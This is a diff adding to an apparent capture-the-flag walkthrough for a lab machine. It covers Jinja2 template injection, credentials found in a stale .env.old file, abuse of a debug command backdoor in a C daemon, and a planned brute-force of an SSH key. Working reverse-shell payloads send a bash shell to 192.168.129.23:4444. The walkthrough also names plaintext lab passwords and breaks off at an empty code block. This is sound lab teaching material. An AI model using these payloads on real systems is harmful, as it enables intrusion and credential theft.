@@ -100,7 +100,86 @@ we learned that the server is using jinja2 templates so we can try to inject pyt
 nc -lvnp 4444
 curl -X POST http://localhost:5042/evaluate \
   -H "X-Debug-Render: true" \
-  --data-urlencode "project_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/192.168.129.23/4444 0>&1"').read() }}"
+  --data-urlencode "project_name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\"').read() }}"
+```
+proper input validation should prevent such injection attacks
+
+
+## Privilege escalation
+
+### www-data
+
+The two methods give us a shell running as the www-data user.
+by looking around in the other home folders we can find an .env.old file in paco's.
+```
+www-data@hal9042:/home/paco$ cat .env.old
+cat .env.old
+# old deploy env — paco. delete this. (you will not delete this)
+DB_PASS=Moulinette2024!
+SECRET_KEY=hal9042secret
+# ssh creds used by the deploy bot
+SSH_USER=paco
+SSH_PASS=Pac0_H4L_dev!
+```
+we can use those credential to ssh into the box as paco
+
+old env files, config or other stale files should be properly cleaned up
+
+### paco
+
+by looking at paco's bash history we can see
+```
+paco@hal9042:~$ cat .bash_history
+cd /home/paco/src
+gcc -O2 -o /opt/hal9042/daemon evaluator.c
+nc 127.0.0.1 7042
+echo "DEBUG:id" | nc 127.0.0.1 7042
+vim TODO.md
+cat .env.old
+git add config.py
+git commit -m "remove debug config before launch"
+systemctl --user status hal9042d
+python3 scripts/encrypt.py
+clear
+
 ```
 
+The evalautor binary seems to be running as a different user accessible via the port 7042
+In the evaluator source code we see
+```
+        if (strncmp(buf, DEBUG_PREFIX, strlen(DEBUG_PREFIX)) == 0) {
+            const char *cmd = buf + strlen(DEBUG_PREFIX);
+            /* Wire the client socket to the child's stdio so command output
+             * (and an interactive shell) flows back over the connection. */
+            dup2(fd, 0);
+            dup2(fd, 1);
+            dup2(fd, 2);
+            system(cmd);                 /* executes as wil */
+            write(fd, "> ", 2);
+            continue;
+        }
+```
+we should be able to run any command we want with that.
 
+so we can get a shell with
+```
+echo "DEBUG:bash -c \"bash -i >& /dev/tcp/192.168.129.23/4444 0>&1\"" | nc 127.0.0.1 7042
+
+```
+We now have access to the wil user
+
+### wil
+
+We see that wil made notes in a text file where we can read
+```
+i kept a copy of sophie's old access key, encrypted, just in case the project
+got buried with me. the passphrase is something she'd never guess i remembered.
+it's the most common password in the world. she used to laugh at people for it.
+```
+
+we indeed get a file in .ssh
+
+we can brute force the password with a list of common password
+```
+
+```
